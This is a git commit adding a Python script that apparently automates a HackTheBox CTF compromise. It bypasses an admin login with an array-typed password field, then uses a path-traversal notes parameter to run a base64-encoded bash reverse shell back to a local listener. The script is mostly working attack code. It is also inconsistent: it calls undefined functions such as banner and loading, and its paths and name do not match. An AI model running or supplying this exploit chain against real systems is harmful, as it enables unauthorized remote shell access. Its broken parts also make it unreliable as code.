49b983606b34fd2e46077d3352731bdf371610fe
Ramon Marsal <80726207+0xEtern4lW0lf@users.noreply.github.com>
2023-01-04 21:26:45 -0300

    Create soccer-getshell.py

---
+++ ScriptsCTF/HTB/soccer-getshell.py
@@ -0,0 +1,131 @@
+#! /usr/bin/env python3
+
+## Author: 0xEtern4lW0lf
+## Created: 04 Jan 2023
+## Description: TEMPLATE
+
+## ========= MODULES =========
+
+# hardler
+import socket, telnetlib
+from threading import Thread
+
+# http lib
+import requests, urllib, urllib3
+urllib3.disable_warnings()
+
+import argparse
+import sys
+import base64
+import time
+
+
+## ========= VARIABLE =========
+
+#### COLORS ####
+RED = "\033[1;91m"
+YELLOW = "\033[1;93m"
+BLUE = "\033[1;94m"
+GREEN = "\033[1;92m"
+END = "\033[1;m "
+
+## Set proxy [OPTIONAL]
+#proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
+
+## ========= FUNCTION =========
+
+
+## Weaponization and Attack
+
+## Set the handler
+def handler(lport,target):
+    print(f"\n{BLUE}[+] LISTEN: {YELLOW}Starting handler on {GREEN}{lport} {BLUE}[+]{END}")
+    tn = telnetlib.Telnet()
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind(("0.0.0.0",lport))
+    s.listen(1)
+    conn, addr = s.accept()
+    loading(8)
+    print(f"{BLUE}[+] LISTEN: {YELLOW}Receiving connection from {GREEN}{target} {BLUE}[+]{END}")
+    tn.sock = conn
+    print(f"\n{BLUE}[+] SUCCESS: {GREEN}HABEMUS SHELL! {BLUE}[+]{END}\n")
+    tn.interact()
+
+## Function encode Base64
+def encodeB64(strg):
+    return base64.b64encode(strg.encode()).decode()
+
+## Create the payload
+def createPayload(lhost,lport):
+    print(f"\n{BLUE}[+] PAYLOAD: {YELLOW}Creating the payload! {BLUE}[+]{END}")
+    global payload
+    payload = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
+    payload = str(encodeB64(payload))
+
+    loading(8)
+    print(f"{BLUE}[+] PAYLOAD: {YELLOW}Payload Created! {BLUE}[+]{END}")
+
+
+# Session HTTP
+r = requests.session()
+
+'''Requests HTTP here'''
+
+def loginAdmin(rhost):
+    print(f"\n{BLUE}[+] LOGIN: {YELLOW}Let's login as admin! {BLUE}[+]{END}")
+    url = f"http://{rhost}:80/department/login.php"
+    headers = {"Content-Type": "application/x-www-form-urlencoded"}
+    data = {"username": "admin", "password[]": "123"}
+    r.post(url, headers=headers, data=data, verify=False)
+
+    loading(8)
+    print(f"{BLUE}[+] LOGIN: {YELLOW}Logged {GREEN}SUCCESSFULLY! {BLUE}[+]{END}")
+
+def getShell(rhost,payload):
+    print(f"\n{BLUE}[+] SHELL: {YELLOW}Getting the SHELL! {BLUE}[+]{END}")
+    payload = urllib.parse.quote(payload, safe='')
+    url = f"http://{rhost}:80/department/manage.php?notes=/ninevehNotes/../var/tmp/0xEtern4lW0lf.php&cmd=echo {payload}|base64 -d | bash"
+    headers = {"Upgrade-Insecure-Requests": "1"}
+    r.get(url, headers=headers, cookies=r.cookies)
+
+
+
+def main():
+    # Parse Arguments
+    parser = argparse.ArgumentParser(description='HackTheBox TEMPLATE AutoShell - 0xEtern4lW0lf')
+    parser.add_argument('-t', '--target', help='Target IP address or Hostname', required=True)
+    parser.add_argument('-li', '--localip', help='Local IP address or Hostname', required=True)
+    parser.add_argument('-lp', '--localport', help='Local port to receive the shell', required=True)
+
+    args = parser.parse_args()
+
+    rhost = args.target
+    lhost = args.localip
+    lport = args.localport
+    
+    # Set up the handler
+    thr = Thread(target=handler,args=(int(lport),rhost))
+    thr.start()
+    loading(3)
+    
+    # Create the payload
+    createPayload(lhost,lport)
+    loading(3)
+    
+    # Create php file
+#    createEvilPHP(rhost)
+    loading(3)
+
+    # Login as admin
+    loginAdmin(rhost)
+    loading(3)
+
+    # Get Reverse shell
+    getShell(rhost,payload)
+    loading(3)
+
+#### ======= EXECUTION =======
+
+if __name__ == '__main__':
+    banner()
+    main()
